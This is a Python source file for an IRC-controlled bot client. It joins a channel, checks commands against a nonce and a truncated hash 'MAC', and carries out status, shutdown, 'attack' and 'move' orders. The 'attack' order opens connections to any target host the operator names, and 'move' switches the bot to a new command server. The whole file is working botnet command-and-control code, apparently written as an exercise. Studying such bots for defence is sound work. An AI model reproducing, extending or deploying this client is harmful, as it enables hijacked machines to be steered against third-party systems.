#!/usr/bin/env python3
import sys
import socket
import time
import hashlib
import random
import string

def generate_nick(): # since irc needs unique names this combines bot with random letters/nums
    return "bot_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))

def compute_mac(nonce, secret):
    data = nonce + secret
    return hashlib.sha256(data.encode()).hexdigest()[:8]

def execute_attack(target, nick, nonce):
    host, port = target.split(':')
    port = int(port)
    try:
        with socket.create_connection((host, port), timeout=3) as s:
            msg = f"{nick} {nonce}"
            s.sendall(msg.encode())
        return f"-attack {nick} OK"
    except TimeoutError:
        return f"-attack {nick} FAIL timeout"
    except ConnectionRefusedError:
        return f"-attack {nick} FAIL connection refused"
    except Exception as e:
        return f"-attack {nick} FAIL {str(e)}"

def send_irc(sock, message):
    sock.sendall((message + "\r\n").encode())

def main_loop():
    if len(sys.argv) != 4:
        sys.exit(1)
        
    target_server = sys.argv[1]
    channel = sys.argv[2]
    secret = sys.argv[3]
    
    host, port = target_server.split(':')
    port = int(port)
    
    seen_nonces = set()
    command_count = 0
    nick = generate_nick()
    
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try: # irc handshake
            s.connect((host, port))
            print("Connected.")
            send_irc(s, f"NICK {nick}")
            send_irc(s, f"USER {nick} 0 * :bot")
            time.sleep(1)
            send_irc(s, f"JOIN {channel}")
            send_irc(s, f"PRIVMSG {channel} :-joined {nick}")
        except Exception:
            print("Failed to connect.")
            time.sleep(5)
            continue
            
        try:
            buffer = ""
            while True:
                data = s.recv(4096)
                if not data:
                    print("Disconnected.")
                    break
                    
                buffer += data.decode()
                while '\r\n' in buffer:
                    line, buffer = buffer.split('\r\n', 1)
                    line = line.strip()
                    if not line:
                        continue
                        
                    if line.startswith("PING"): # sends ping message and if the bot doesn't reply then the server kicks it off
                        send_irc(s, line.replace("PING", "PONG", 1))
                        continue
                        
                    if "PRIVMSG" in line: # splits the string to isolate the actual text typed into the channel
                        parts = line.split(":", 2)
                        if len(parts) >= 3:
                            msg_content = parts[2].strip()
                            cmd_parts = msg_content.split()
                            if len(cmd_parts) >= 3:
                                nonce = cmd_parts[0]
                                mac = cmd_parts[1]
                                command = cmd_parts[2]
                                args = cmd_parts[3:]
                                
                                if nonce in seen_nonces:
                                    continue
                                    
                                calculated_mac = compute_mac(nonce, secret)
                                if calculated_mac != mac:
                                    continue
                                    
                                seen_nonces.add(nonce)
                                command_count += 1
                                
                                if command == "status":
                                    send_irc(s, f"PRIVMSG {channel} :-status {nick} {command_count}")
                                elif command == "shutdown":
                                    send_irc(s, f"PRIVMSG {channel} :-shutdown {nick}")
                                    sys.exit(0)
                                elif command == "attack":
                                    if args:
                                        res = execute_attack(args[0], nick, nonce)
                                        send_irc(s, f"PRIVMSG {channel} :{res}")
                                elif command == "move":
                                    if args:
                                        send_irc(s, f"PRIVMSG {channel} :-move {nick}")
                                        new_target = args[0]
                                        host, new_port = new_target.split(':')
                                        port = int(new_port)
                                        break
                                        
            if command == "move":
                continue
                
        except Exception:
            print("Disconnected.")
            
        s.close()
        time.sleep(5)

if __name__ == "__main__":
    main_loop()
